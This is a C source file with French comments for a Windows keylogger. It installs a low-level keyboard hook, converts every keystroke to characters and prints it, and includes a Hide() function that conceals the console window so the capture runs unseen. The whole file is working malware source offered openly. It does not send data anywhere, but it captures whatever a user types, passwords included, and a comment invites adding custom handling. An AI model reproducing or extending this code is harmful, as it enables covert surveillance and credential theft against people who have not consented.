#include "Keylogger.h"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <direct.h>

HHOOK hKeyHook;

DWORD WINAPI KeyLogger(LPVOID lpParameter)
{
    // Récuperation de l'instance de notre executable
    HINSTANCE hExe = GetModuleHandle(NULL);
    if (!hExe)
        return 1;

    // on demarre le hook
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, hExe, NULL);
    if (hKeyHook == NULL)
        printf("[le hook clavier a plante !]\n");
    else
        printf("[hook clavier en cours ...]\n");

    // Boucle des messages
    MsgLoop();

    // on desactive le hook
    if (UnhookWindowsHookEx(hKeyHook) == 0)
        printf("[desactivation du Hook echoue !]");
    else
        printf("[la desactivation du hook c'est passee correctement]");

    return 0;
}

void MsgLoop()
{
    MSG message;
    while (GetMessage(&message, NULL, 0, 0))
    {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
}

__declspec(dllexport) LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
    // Action du clavier et les touches tapp�es
    if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN))
    {
        // conversion du code -> ascii
        BYTE KeyState[256];
        WORD wBuf;
        char ch;

        // Structure pour récupération des informations
        KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT *)lParam);

        /* Traitement récupération dec codes des touches */

        // Etat du clavier
        GetKeyboardState(KeyState);

        // Conversion code > ascii
        ToAscii(hooked.vkCode, hooked.scanCode, KeyState, &wBuf, 0);

        //on rajoute les touches non traitées par le hook
        switch (hooked.vkCode)
        {
            case 9:
                printf("<TAB>");
                break;
            case 13:
                printf("<ENTER>");
                break;
            case VK_BACK:
                printf("<delete>");
                break;
            case VK_DELETE:
                printf("<Suppr>");
                break;

                /* vous pouvez rajouter vos traitements perso ici ! */

            default: // on affiche les touches tappées
                ch = ((char)wBuf);
                printf("%c", ch);
                break;
        }
    }
    
    // Renvoi des messages au syt�me
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

void Hide()
{
    HWND hide;
    AllocConsole();
    hide = FindWindowA("consoleWindowClass", NULL);
    ShowWindow(hide, 0);
}
